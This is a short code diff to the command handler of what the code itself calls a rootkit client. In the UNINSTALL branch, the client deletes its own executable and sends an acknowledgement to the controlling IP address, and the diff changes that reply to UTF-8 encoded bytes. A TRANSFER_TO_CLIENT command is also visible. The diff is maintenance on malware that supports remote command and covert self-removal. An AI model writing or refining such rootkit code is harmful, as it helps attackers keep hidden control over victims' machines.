@@ -335,7 +335,8 @@ class Client:
             print("[*] Processing UNINSTALL")
             print("    Initiating uninstall sequence...")
             os.remove(sys.argv[0])
-            self.send_response(src_ip, CommandType.ACK, "Rootkit uninstalled from client\n")
+            uninstall_msg = "Rootkit uninstalled from client"
+            self.send_response(src_ip, CommandType.ACK, uninstall_msg.encode('utf-8'))
 
         elif command_type == CommandType.TRANSFER_TO_CLIENT:
             print("[*] Processing TRANSFER_TO_CLIENT")
